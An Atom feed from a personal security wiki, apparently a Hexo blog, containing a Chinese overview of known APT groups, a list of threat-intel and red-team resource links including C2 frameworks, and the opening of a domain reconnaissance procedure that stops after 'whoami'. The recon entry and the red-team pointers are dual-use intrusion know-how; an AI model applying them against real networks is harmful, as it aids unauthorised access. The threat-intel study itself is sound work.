<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Tahir&#39;s Wiki</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2022-05-20T03:33:20.676Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>Tahir</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Christina heart line</title>
    <link href="http://example.com/wiki/Christina-heart-line/"/>
    <id>http://example.com/wiki/Christina-heart-line/</id>
    <published>2022-05-20T02:52:27.000Z</published>
    <updated>2022-05-20T03:33:20.676Z</updated>
    
    <content type="html"><![CDATA[<p>Christina heart line，The secret mathematical formula between Descartes and Christine.</p><p>r=a(1－sinθ)</p><center><img src="/wiki/Christina-heart-line/heart.gif" width height></center>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Christina heart line，The secret mathematical formula between Descartes and Christine.&lt;/p&gt;
&lt;p&gt;r=a(1－sinθ)&lt;/p&gt;
&lt;center&gt;&lt;img src=&quot;/wiki/Chri</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>知名APT组织概述</title>
    <link href="http://example.com/wiki/6.%20%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5/APT%E6%83%85%E6%8A%A5/%E7%9F%A5%E5%90%8DAPT%E7%BB%84%E7%BB%87%E6%A6%82%E8%BF%B0/"/>
    <id>http://example.com/wiki/6.%20%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5/APT%E6%83%85%E6%8A%A5/%E7%9F%A5%E5%90%8DAPT%E7%BB%84%E7%BB%87%E6%A6%82%E8%BF%B0/</id>
    <published>2021-08-04T06:49:22.000Z</published>
    <updated>2021-08-04T07:01:18.688Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Metadata"><a href="#Metadata" class="headerlink" title="Metadata"></a>Metadata</h2><table><thead><tr><th>Author</th><th>Tahir</th></tr></thead><tbody><tr><td>Creation Date</td><td>2021/08/04</td></tr><tr><td>Modification Date</td><td>2021/08/04</td></tr><tr><td>Tactics</td><td>None</td></tr><tr><td>Techniques</td><td>None</td></tr></tbody></table><h2 id="知名APT组织全景图"><a href="#知名APT组织全景图" class="headerlink" title="知名APT组织全景图"></a>知名APT组织全景图</h2><p><img src="/wiki/6.%20%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5/APT%E6%83%85%E6%8A%A5/%E7%9F%A5%E5%90%8DAPT%E7%BB%84%E7%BB%87%E6%A6%82%E8%BF%B0/1.png"></p><p><img src="/wiki/6.%20%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5/APT%E6%83%85%E6%8A%A5/%E7%9F%A5%E5%90%8DAPT%E7%BB%84%E7%BB%87%E6%A6%82%E8%BF%B0/2.png"></p><h2 id="APT-C-01-毒云藤"><a href="#APT-C-01-毒云藤" class="headerlink" title="APT-C-01 毒云藤"></a><strong>APT-C-01 毒云藤</strong></h2><p>组织介绍</p><p>毒云藤，又名绿斑、APT-C-01等，是一个长期针对国内国防、政府、科技和教育领域的重要机构实施网络间谍攻击活动的APT团伙，最早可以追溯到2007年。该组织惯用鱼叉式钓鱼网络攻击，会选取与攻击目标贴合的诱饵内容进行攻击活动，惯用的主题包括通知、会议材料、研究报告等或是采用攻击时间段时事主题。除了附件投递木马外，毒云藤还惯用钓鱼网站钓鱼，窃取目标的账户密码，进而获得更多重要信息。该组织主要关注方向包括：海事、军工、涉台两岸关系、中美关系等。</p><h2 id="APT32-海莲花"><a href="#APT32-海莲花" class="headerlink" title="APT32 海莲花"></a><strong>APT32 海莲花</strong></h2><p>组织介绍</p><p>海莲花（OceanLotus）组织，似越南政府背景，攻击活动至少可追溯到2012年，长期针对中国及其他东亚国家（地区）政府、科研机构、海运企业等领域进行攻击。其会对在越南制造业、科技公司、消费品行业和酒店业中有既得利益的外国企业进行了长时间的入侵与渗透，以及一直会以外国政府和对越南持不同政治意见的个人和媒体为主要目标。从2012年至今，持续对中国政府、科研院所、海事机构、海域建设、航运企业等相关重要领域进行长时间 不间断攻击。至今十分活跃。</p><h2 id="T-APT-17-蔓灵花"><a href="#T-APT-17-蔓灵花" class="headerlink" title="T-APT-17 蔓灵花"></a><strong>T-APT-17 蔓灵花</strong></h2><p>组织介绍</p><p>蔓灵花(Bitter)是一个来自南亚某国的APT组织，长期针对中国及巴基斯坦的政府、军工、电力、核等部门发动网络攻击，窃取敏感资料，具有较强的政治背景。是目前活跃的针对境内目标进行攻击的境外APT组织之一。该组织最早在2016由美国安全公司Forcepoint进行了披露，他们发现攻击者使用的远程访问工具（RAT）变体使用的网络通信头包含 “BITTER”，所以该这次攻击命名为“BITTER”。其攻击活动最早可追溯到2013年，从2016年始出现对国内的攻击活动。</p><h2 id="APT-C-09-白象"><a href="#APT-C-09-白象" class="headerlink" title="APT-C-09 白象"></a><strong>APT-C-09 白象</strong></h2><p>组织介绍</p><p>Patchwork组织， 是一个来自于南亚地区的境外APT组织。该组织最早由Norman安全公司于2013年曝光，随后又有其他安全厂商持续追踪并披露该组织的最新活动，但该组织并未由于相关攻击行动曝光而停止对相关目标的攻击。白象APT组织主要针对中国、巴基斯坦等亚洲地区国家进行网络间谍活动，其中以窃取敏感信息为主.相关攻击活动最早可以追溯到2009年11月，至今还非常活跃.在针对中国地区的攻击中，该组织主要针对政府机构、科研教育领域进行攻击，其中以科研教育领域为主。</p><h2 id="APT-C-06-黑店"><a href="#APT-C-06-黑店" class="headerlink" title="APT-C-06 黑店"></a><strong>APT-C-06 黑店</strong></h2><p>组织介绍</p><p>Darkhotel，是一个来自朝鲜半岛的网络间谍组织，近几年来最活跃的APT组织之一，是一个老牌组织，至少存在10年以上。此前因其攻击目标是入住高端酒店的商务人士或有关国家政要，以酒店WiFi网络为入口对目标进行攻击，因此得名DarkHotel ，中文译作“黑店”。主要攻击对象包括电子通信、商贸行业、工业等企业及高管、有关国家政要人物和政要机构等，目标遍布中国、朝鲜、日本、缅甸、俄罗斯等多个国家。技术实力深厚，如在多次行动中使用0day进行攻击。</p><h2 id="APT-C-26-Lazarus"><a href="#APT-C-26-Lazarus" class="headerlink" title="APT-C-26 Lazarus"></a><strong>APT-C-26 Lazarus</strong></h2><p>组织介绍</p><p>Lazarus组织被认为是来自朝鲜的APT组织，攻击目标遍布全球，最早的活动时间可以追溯至2007年，其主要目标包括国防、政府、金融、能源等，早期主要以窃取情报为目的，自2014年后进行业务扩张，攻击目标拓展到金融机构、虚拟货币交易所等具有较高经济价值的对象。资料显示，2014 年索尼影业遭黑客攻击事件、2016 年孟加拉国银行数据泄露事件、2017年美国国防承包商和能源部门、同年英韩等国比特币交易所攻击事件以及今年针对众多国家国防和航空航天公司的攻击等事件皆被认为与此组织有关。</p><h2 id="APT-C-17-响尾蛇"><a href="#APT-C-17-响尾蛇" class="headerlink" title="APT-C-17 响尾蛇"></a><strong>APT-C-17 响尾蛇</strong></h2><p>组织介绍</p><p>响尾蛇( Sidewinder)是2018年才被披露的网络威胁组织，疑似与印度有关。该组织长期针对中国和巴基斯坦等东南亚国家的政府，能源，军事，矿产等领域进行敏感信息窃取等攻击活动。SideWinder的最早活动可追溯到2012年，被捕获的诱饵文档中包含“巴基斯坦政府经济事务部”等关键字，可见是对特定目标的定向攻击行为。从近几年该组织活动来看也会针对国内特定目标进行攻击，如驻华大使馆，特定部门等。</p><h2 id="APT-C-16-索伦之眼"><a href="#APT-C-16-索伦之眼" class="headerlink" title="APT-C-16 索伦之眼"></a><strong>APT-C-16 索伦之眼</strong></h2><p>组织介绍</p><p>索伦之眼为2016年赛门铁克披露的一个针对俄罗斯、中国等国家发动高级攻击的APT组织，其主要以窃取敏感信息为主要目的，活动最早可追溯到2010年。国内受影响用户包括科研教育、军事、政府机构、基础设施、水利、海洋等行业领域。专注于收集高价值情报。综合能力不弱于震网、火焰等。</p><h2 id="APT-C-15-人面狮"><a href="#APT-C-15-人面狮" class="headerlink" title="APT-C-15 人面狮"></a><strong>APT-C-15 人面狮</strong></h2><p>组织介绍</p><p>人面狮行动是活跃在中东地区的网络间谍活动，主要目标可能涉及到埃及和以色列等国家的不同组织，目的是窃取目标敏感数据信息。活跃时间主要集中在 2014 年 6 月到 2015年 11 月期间，相关攻击活动最早可以追溯到 2011 年 12 月。主要采用利用社交网络进行水坑攻击。</p><h2 id="APT-C-39-Longhorn"><a href="#APT-C-39-Longhorn" class="headerlink" title="APT-C-39 Longhorn"></a><strong>APT-C-39 Longhorn</strong></h2><p>组织介绍</p><p>APT-C-39，美国中央情报局(CIA)背景，对我国进行的长达十一年的网络攻击渗透，我国航空航天、科研机构、石油行业、大型互联网公司以及政府机构等多个单位均受到影响。其核心武器文件使用了维基解密曝光的美国中央情报局CIA网络情报中心的文件中的“Vault7（穹窿7）”项目。</p><h2 id="APT-C-35-肚脑虫"><a href="#APT-C-35-肚脑虫" class="headerlink" title="APT-C-35 肚脑虫"></a><strong>APT-C-35 肚脑虫</strong></h2><p>组织介绍</p><p>肚脑虫（Donot）组织，具有印度背景，主要针对巴基斯坦、克什米尔地区等南亚地区国家进行网络间谍活动的组织，通常以窃密敏感信息为目的。该组织具备针对Windows与Android双平台的攻击能力，其主要使用yty和EHDevel等恶意软件框架。攻击活动最早发现在2016年4月，目前仍持续活跃。国内受影响度相对较小。</p><h2 id="APT37-APT37"><a href="#APT37-APT37" class="headerlink" title="APT37 APT37"></a><strong>APT37 APT37</strong></h2><p>组织介绍</p><p>APT37是一个疑似来自朝鲜的网络间谍组织，至少从2012年开始就已经活跃，该组织主要针对韩国，日本，越南，俄罗斯，尼泊尔，中国，印度，罗马尼亚，科威特和中东等国家或地区进行攻击。国内主要目标为外贸公司、在华外企高管，甚至政府部门等。</p><h2 id="APT-C-12-蓝宝菇"><a href="#APT-C-12-蓝宝菇" class="headerlink" title="APT-C-12 蓝宝菇"></a><strong>APT-C-12 蓝宝菇</strong></h2><p>组织介绍</p><p>蓝宝菇（BlueMushroom）组织，2018年才被披露，其从2011年开始就针对我国政府、军工、科研、金融、教育等重点单位和部门进行网络间谍活动，比较关注工业和科研领域，攻击对象主要都集中在中国大陆境内。</p><h2 id="APT28-奇幻熊"><a href="#APT28-奇幻熊" class="headerlink" title="APT28 奇幻熊"></a><strong>APT28 奇幻熊</strong></h2><p>组织介绍</p><p>“奇幻熊”（Fancy Bear，T-APT-12）组织，也被称作APT28, Pawn Storm, Sofacy Group, Sednit或STRONTIUM，是一个长期从事网络间谍活动并与俄罗斯军方情报机构相关的APT组织，从该组织的历史攻击活动可以看出，获取国家利益一直是该组织的主要攻击目的。据国外安全公司报道，该组织最早的攻击活动可以追溯到2004年至2007年期间。</p><h2 id="黑格莎"><a href="#黑格莎" class="headerlink" title="黑格莎"></a><strong>黑格莎</strong></h2><p>组织介绍</p><p>黑格莎组织是2019年披露的一个来自朝鲜半岛的专业APT组织，因为其常用higaisa作为加密密码而得名。该组织具有政府背景，其活动至少可以追溯到2016年，且一直持续活跃。该组织常利用节假日、朝鲜国庆等朝鲜重要时间节点来进行钓鱼活动，诱饵内容包括新年祝福、元宵祝福、朝鲜国庆祝福，以及重要新闻、海外人员联系录等等。被攻击的对象包括跟朝鲜相关的外交实体（如驻各地大使馆官员）、政府官员、人权组织、朝鲜海外居民、贸易往来人员等，受害国家包括中国、朝鲜、日本、尼泊尔、新加坡、俄罗斯、波兰、瑞士等。</p><h2 id="Confucius"><a href="#Confucius" class="headerlink" title="Confucius"></a><strong>Confucius</strong></h2><p>组织介绍</p><p>Confucius是一个印度背景的APT组织，攻击活动最早可追溯到2013年，主要针对南亚各国的政府、军事等行业目标进行攻击。该组织在恶意代码和基础设施上与Patchwork存在重叠，但目标侧重有所不同。</p><h2 id="方程式"><a href="#方程式" class="headerlink" title="方程式"></a><strong>方程式</strong></h2><p>组织介绍</p><p>方程式组织是一个由卡巴斯基实验室于2015年发现并曝光的尖端网络犯罪组织，该组织被称为世界上最尖端的网络攻击组织之一，同震网（Stuxnet）和火焰（Flame）病毒的制造者紧密合作且在幕后操作。方程式组织的名字来源于他们在网络攻击中对使用强大加密方法的偏好。其与美国国家安全局（NSA）存在联系。并且该组织使用的C2地址早在1996年就被注册，暗示了其存在了20年之久。该组织实力雄厚，在漏洞方面具有绝对优势，并且拥有强大的武器库。涉及的行业包括政府和外交机构、电信、航天、能源、核研究、军事、纳米技术、宗教活动家、媒体、运输业、金融行业等。</p><h2 id="APT29-APT29"><a href="#APT29-APT29" class="headerlink" title="APT29 APT29"></a><strong>APT29 APT29</strong></h2><p>组织介绍</p><p>APT29归属于俄罗斯，政府背景，和俄罗斯一个或多个情报机构有关，其收集情报以支持外交和安全政策做决定，至少自2008年开始就已经运作。APT29似乎针对不同的目标项目拥有不同的小组。其目标包括军事、政府、能源、外交、电信等。主要针对西方政府和相关组织，例如政府部门和机构，政治智囊团和政府分包商；还包括独立国家联合体成员国的政府；亚洲、非洲和中东国家的政府；与车臣极端主义有关的组织；以及从事管制药物和毒品非法贸易的俄罗斯发言人等。</p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><blockquote><ul><li><a href="https://ti.dbappsecurity.com.cn/aptMap">https://ti.dbappsecurity.com.cn/aptMap</a></li><li><a href="https://apt.360.cn/aptlist">https://apt.360.cn/aptlist</a></li></ul></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Metadata&quot;&gt;&lt;a href=&quot;#Metadata&quot; class=&quot;headerlink&quot; title=&quot;Metadata&quot;&gt;&lt;/a&gt;Metadata&lt;/h2&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Author&lt;/th&gt;
&lt;th&gt;Tahir&lt;/t</summary>
      
    
    
    
    <category term="6. 威胁情报" scheme="http://example.com/categories/6-%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5/"/>
    
    <category term="APT情报" scheme="http://example.com/categories/6-%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5/APT%E6%83%85%E6%8A%A5/"/>
    
    
    <category term="APT情报" scheme="http://example.com/tags/APT%E6%83%85%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>学习资源</title>
    <link href="http://example.com/wiki/7.%20%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%BA%90/%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%BA%90/"/>
    <id>http://example.com/wiki/7.%20%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%BA%90/%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%BA%90/</id>
    <published>2021-08-04T06:29:06.000Z</published>
    <updated>2021-08-04T06:54:24.646Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Metadata"><a href="#Metadata" class="headerlink" title="Metadata"></a>Metadata</h2><table><thead><tr><th>Author</th><th>Tahir</th></tr></thead><tbody><tr><td>Creation Date</td><td>2021/08/04</td></tr><tr><td>Modification Date</td><td>2021/08/04</td></tr><tr><td>Tactics</td><td>None</td></tr><tr><td>Techniques</td><td>None</td></tr></tbody></table><h2 id="APT-report"><a href="#APT-report" class="headerlink" title="APT report"></a>APT report</h2><h3 id="APT-REPORT"><a href="#APT-REPORT" class="headerlink" title="APT_REPORT"></a>APT_REPORT</h3><ul><li><a href="https://github.com/blackorbird/APT_REPORT">https://github.com/blackorbird/APT_REPORT</a></li></ul><h3 id="APT-CyberCriminal-Campagin-Collections"><a href="#APT-CyberCriminal-Campagin-Collections" class="headerlink" title="APT_CyberCriminal_Campagin_Collections"></a>APT_CyberCriminal_Campagin_Collections</h3><ul><li><a href="https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections">https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections</a></li></ul><h3 id="aptnotes"><a href="#aptnotes" class="headerlink" title="aptnotes"></a>aptnotes</h3><ul><li><a href="https://github.com/aptnotes">https://github.com/aptnotes</a></li></ul><h3 id="CyberThreatIntel"><a href="#CyberThreatIntel" class="headerlink" title="CyberThreatIntel"></a>CyberThreatIntel</h3><ul><li><a href="https://github.com/StrangerealIntel/CyberThreatIntel">https://github.com/StrangerealIntel/CyberThreatIntel</a></li></ul><h2 id="红队资源"><a href="#红队资源" class="headerlink" title="红队资源"></a>红队资源</h2><ul><li><p>Red Team Notes <a href="https://dmcxblue.gitbook.io/red-team-notes/">https://dmcxblue.gitbook.io/red-team-notes/</a></p></li><li><p>Red Teaming Experiments <a href="https://ired.team/">https://ired.team/</a></p></li><li><p>atomic-red-team <a href="https://github.com/redcanaryco/atomic-red-team/">https://github.com/redcanaryco/atomic-red-team/</a></p></li><li><p>Infosec_Reference <a href="https://rmusser.net/docs/RT.html">https://rmusser.net/docs/RT.html</a></p></li><li><p>HackTricks <a href="https://book.hacktricks.xyz/">https://book.hacktricks.xyz/</a></p></li><li><p>Malware and Stuff <a href="https://malwareandstuff.com/">https://malwareandstuff.com/</a></p></li><li><p>棱角 <a href="https://forum.ywhack.com/bountytips.php?redteam">https://forum.ywhack.com/bountytips.php?redteam</a></p></li></ul><h2 id="C2s"><a href="#C2s" class="headerlink" title="C2s"></a>C2s</h2><p>The C2 Matrix <a href="https://www.thec2matrix.com/">https://www.thec2matrix.com/</a></p><h2 id="安全公司"><a href="#安全公司" class="headerlink" title="安全公司"></a>安全公司</h2><ul><li><p><a href="https://cybersecurity.att.com/blogs/labs-research/">https://cybersecurity.att.com/blogs/labs-research/</a></p></li><li><p><a href="https://blog.avast.com/">https://blog.avast.com/</a></p></li><li><p><a href="https://www.forcepoint.com/blog">https://www.forcepoint.com/blog</a></p></li><li><p><a href="https://blog.talosintelligence.com/">https://blog.talosintelligence.com/</a></p></li><li><p><a href="https://blog.nviso.eu/">https://blog.nviso.eu/</a></p></li><li><p><a href="https://blog.malwarebytes.com/">https://blog.malwarebytes.com/</a></p></li><li><p><a href="https://blog.trendmicro.com/">https://blog.trendmicro.com/</a></p></li><li><p><a href="https://www.cybereason.com/blog">https://www.cybereason.com/blog</a></p></li><li><p><a href="https://unit42.paloaltonetworks.com/">https://unit42.paloaltonetworks.com/</a></p></li><li><p><a href="https://www.fortinet.com/blog">https://www.fortinet.com/blog</a></p></li><li><p><a href="https://www.tarlogic.com/en/cybersecurity-blog/">https://www.tarlogic.com/en/cybersecurity-blog/</a></p></li><li><p><a href="https://www.coveware.com/blog">https://www.coveware.com/blog</a></p></li><li><p><a href="https://www.sentinelone.com/blog/">https://www.sentinelone.com/blog/</a></p></li><li><p><a href="https://securelist.com/">https://securelist.com/</a></p></li><li><p><a href="https://www.apriorit.com/reverse-blog">https://www.apriorit.com/reverse-blog</a></p></li><li><p><a href="https://blog.f-secure.com/">https://blog.f-secure.com/</a></p></li><li><p><a href="https://objective-see.com/blog/">https://objective-see.com/blog/</a></p></li><li><p><a href="https://www.virusbulletin.com/blog/">https://www.virusbulletin.com/blog/</a></p></li><li><p><a href="https://research.checkpoint.com/">https://research.checkpoint.com/</a></p></li><li><p><a href="https://www.intezer.com/blog/">https://www.intezer.com/blog/</a></p></li><li><p><a href="https://www.zscaler.com/blogs">https://www.zscaler.com/blogs</a></p></li><li><p><a href="https://www.proofpoint.com/us/blog">https://www.proofpoint.com/us/blog</a></p></li><li><p><a href="https://www.anomali.com/blog">https://www.anomali.com/blog</a></p></li><li><p><a href="https://www.acronis.com/en-us/blog/">https://www.acronis.com/en-us/blog/</a></p></li><li><p><a href="https://yoroi.company/research/">https://yoroi.company/research/</a></p></li><li><p><a href="https://www.gdatasoftware.com/blog/techblog">https://www.gdatasoftware.com/blog/techblog</a></p></li><li><p><a href="https://labs.inquest.net/">https://labs.inquest.net/</a></p></li><li><p><a href="https://www.crowdstrike.com/blog">https://www.crowdstrike.com/blog</a></p></li></ul><h2 id="博客"><a href="#博客" class="headerlink" title="博客"></a>博客</h2><ul><li><p>SpecterOps  <a href="https://posts.specterops.io/">https://posts.specterops.io/</a></p></li><li><p>Hacking Articles <a href="https://www.hackingarticles.in/">https://www.hackingarticles.in/</a></p></li><li><p>Penetration Testing Lab <a href="https://pentestlab.blog/">https://pentestlab.blog/</a></p></li><li><p>MDSec blog <a href="https://www.mdsec.co.uk/blog/">https://www.mdsec.co.uk/blog/</a></p></li><li><p>Active Directory Security <a href="https://adsecurity.org/">https://adsecurity.org/</a></p></li><li><p>Rasta Mouse <a href="https://rastamouse.me/">https://rastamouse.me/</a></p></li><li><p>NetSPI Blog <a href="https://blog.netspi.com/">https://blog.netspi.com/</a></p></li><li><p>Didier Stevens <a href="https://blog.didierstevens.com/">https://blog.didierstevens.com/</a></p></li><li><p>3gstudent <a href="https://3gstudent.github.io/">https://3gstudent.github.io/</a></p></li><li><p>F-Secure ·<a href="https://labs.f-secure.com/blog/">https://labs.f-secure.com/blog/</a></p></li><li><p>fireeye <a href="https://www.fireeye.com/blog/threat-research.html">https://www.fireeye.com/blog/threat-research.html</a></p></li><li><p>black hills <a href="https://www.blackhillsinfosec.com/blog/">https://www.blackhillsinfosec.com/blog/</a></p></li><li><p>pentestlaboratories <a href="https://pentestlaboratories.com/blog/">https://pentestlaboratories.com/blog/</a></p></li><li><p>Fox-it <a href="https://blog.fox-it.com/">https://blog.fox-it.com/</a></p></li><li><p>Evi1cg <a href="https://evi1cg.me/">https://evi1cg.me/</a></p></li><li><p>Dirk-jan Mollema <a href="https://dirkjanm.io/">https://dirkjanm.io/</a></p></li><li><p>Shenanigans Labs <a href="https://shenaniganslabs.io/">https://shenaniganslabs.io/</a></p></li><li><p>Stealthbits <a href="https://stealthbits.com/blog/">https://stealthbits.com/blog/</a></p></li><li><p>COMPASS SECURITY BLOG <a href="https://blog.compass-security.com/">https://blog.compass-security.com/</a></p></li><li><p>SpiderLabs Blog <a href="https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/">https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/</a></p></li><li><p>XPN <a href="https://blog.xpnsec.com/">https://blog.xpnsec.com/</a></p></li><li><p>SecureAuth blog <a href="https://www.secureauth.com/blog/">https://www.secureauth.com/blog/</a></p></li><li><p>Something pVVn3|) this way comes. <a href="https://exploit.ph/">https://exploit.ph/</a></p></li><li><p>batsec <a href="https://blog.dylan.codes/">https://blog.dylan.codes/</a></p></li><li><p>Shells.Systems <a href="https://shells.systems/">https://shells.systems/</a></p></li></ul><h2 id="安全会议"><a href="#安全会议" class="headerlink" title="安全会议"></a>安全会议</h2><h3 id="BlackHat"><a href="#BlackHat" class="headerlink" title="BlackHat"></a>BlackHat</h3><ul><li><a href="https://www.blackhat.com/">https://www.blackhat.com/</a></li></ul><h3 id="DefCon"><a href="#DefCon" class="headerlink" title="DefCon"></a>DefCon</h3><ul><li><a href="https://www.defcon.org/">https://www.defcon.org/</a></li></ul><h3 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h3><ul><li><a href="https://www.rsaconference.com/">https://www.rsaconference.com/</a></li></ul><h3 id="x33fcon"><a href="#x33fcon" class="headerlink" title="x33fcon"></a>x33fcon</h3><ul><li><a href="https://www.x33fcon.com/#!index.md">https://www.x33fcon.com/#!index.md</a></li></ul><h3 id="DerbyCon"><a href="#DerbyCon" class="headerlink" title="DerbyCon"></a>DerbyCon</h3><ul><li><a href="https://twitter.com/derbycon">https://twitter.com/derbycon</a></li></ul><h3 id="Security-BSides"><a href="#Security-BSides" class="headerlink" title="Security BSides"></a>Security BSides</h3><ul><li><a href="http://www.securitybsides.com/w/page/12194156/FrontPage">http://www.securitybsides.com/w/page/12194156/FrontPage</a></li></ul><h3 id="ShmooCon"><a href="#ShmooCon" class="headerlink" title="ShmooCon"></a>ShmooCon</h3><ul><li><a href="https://www.shmoocon.org/">https://www.shmoocon.org/</a></li></ul><h3 id="CanSecWest"><a href="#CanSecWest" class="headerlink" title="CanSecWest"></a>CanSecWest</h3><ul><li><a href="https://www.secwest.net/">https://www.secwest.net/</a></li></ul><h3 id="HITBSecConf"><a href="#HITBSecConf" class="headerlink" title="HITBSecConf"></a>HITBSecConf</h3><ul><li><a href="https://conference.hitb.org/">https://conference.hitb.org/</a></li></ul><h3 id="NullCon"><a href="#NullCon" class="headerlink" title="NullCon"></a>NullCon</h3><ul><li><a href="https://nullcon.net/">https://nullcon.net/</a></li></ul><h3 id="GrrCON"><a href="#GrrCON" class="headerlink" title="GrrCON"></a>GrrCON</h3><ul><li><a href="https://grrcon.com/">https://grrcon.com/</a></li></ul><h3 id="HOPE-Conference"><a href="#HOPE-Conference" class="headerlink" title="HOPE Conference"></a>HOPE Conference</h3><ul><li><a href="https://hope.net/">https://hope.net/</a></li></ul><h2 id="公众号"><a href="#公众号" class="headerlink" title="公众号"></a>公众号</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">micropest</span><br><span class="line">moonsec</span><br><span class="line">bypass</span><br><span class="line">鸿鹄实验室</span><br><span class="line">腾讯玄武实验室</span><br><span class="line">看雪学院</span><br><span class="line">潇湘信安</span><br><span class="line">重生信息安全</span><br><span class="line">信安之路</span><br><span class="line">安全族</span><br><span class="line">LemonSec</span><br><span class="line">酒仙桥六号部队</span><br><span class="line">HACK学习呀</span><br></pre></td></tr></table></figure><h2 id="威胁猎捕"><a href="#威胁猎捕" class="headerlink" title="威胁猎捕"></a>威胁猎捕</h2><h3 id="Windows日志"><a href="#Windows日志" class="headerlink" title="Windows日志"></a>Windows日志</h3><ul><li><a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/security-auditing-overview">https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/security-auditing-overview</a></li></ul><h3 id="ThreatHunter-Playbook"><a href="#ThreatHunter-Playbook" class="headerlink" title="ThreatHunter-Playbook"></a>ThreatHunter-Playbook</h3><ul><li><a href="https://github.com/OTRF/ThreatHunter-Playbook">https://github.com/OTRF/ThreatHunter-Playbook</a></li></ul><h3 id="Detection-Rules"><a href="#Detection-Rules" class="headerlink" title="Detection Rules"></a>Detection Rules</h3><ul><li><a href="https://github.com/elastic/detection-rules">https://github.com/elastic/detection-rules</a></li></ul><h3 id="Sigma"><a href="#Sigma" class="headerlink" title="Sigma"></a>Sigma</h3><ul><li><a href="https://github.com/Neo23x0/sigma">https://github.com/Neo23x0/sigma</a></li></ul><h3 id="awesome-yara"><a href="#awesome-yara" class="headerlink" title="awesome-yara"></a>awesome-yara</h3><ul><li><a href="https://github.com/InQuest/awesome-yara">https://github.com/InQuest/awesome-yara</a></li></ul><h3 id="Hunting-MindMaps"><a href="#Hunting-MindMaps" class="headerlink" title="Hunting MindMaps"></a>Hunting MindMaps</h3><ul><li><a href="https://github.com/sbousseaden/Slides">https://github.com/sbousseaden/Slides</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Metadata&quot;&gt;&lt;a href=&quot;#Metadata&quot; class=&quot;headerlink&quot; title=&quot;Metadata&quot;&gt;&lt;/a&gt;Metadata&lt;/h2&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Author&lt;/th&gt;
&lt;th&gt;Tahir&lt;/t</summary>
      
    
    
    
    <category term="7. 学习资源" scheme="http://example.com/categories/7-%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%BA%90/"/>
    
    
  </entry>
  
  <entry>
    <title>域信息搜集</title>
    <link href="http://example.com/wiki/4.%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/1-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/%E5%9F%9F%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"/>
    <id>http://example.com/wiki/4.%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/1-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/%E5%9F%9F%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/</id>
    <published>2021-08-04T03:18:35.000Z</published>
    <updated>2021-08-04T03:48:39.138Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Metadata"><a href="#Metadata" class="headerlink" title="Metadata"></a>Metadata</h2><table><thead><tr><th>Author</th><th>Tahir</th></tr></thead><tbody><tr><td>Creation Date</td><td>2021/08/04</td></tr><tr><td>Modification Date</td><td>2021/08/04</td></tr><tr><td>Tactics</td><td>None</td></tr><tr><td>Techniques</td><td>None</td></tr></tbody></table><h2 id="Tactics"><a href="#Tactics" class="headerlink" title="Tactics"></a>Tactics</h2><p>None</p><h2 id="Techniques"><a href="#Techniques" class="headerlink" title="Techniques"></a>Techniques</h2><p>None</p><h2 id="Procedure"><a href="#Procedure" class="headerlink" title="Procedure"></a>Procedure</h2><h2 id="查询当前权限"><a href="#查询当前权限" class="headerlink" title="查询当前权限"></a>查询当前权限</h2><h3 id="查看当前权限"><a href="#查看当前权限" class="headerlink" title="查看当前权限"></a>查看当前权限</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami</span><br></pre></td></tr></table></figure><p>获取当前权限有以下三种情况：</p><ul><li>本地普通用户：当前为tahir-pc本机的tahir用户</li></ul><p><img 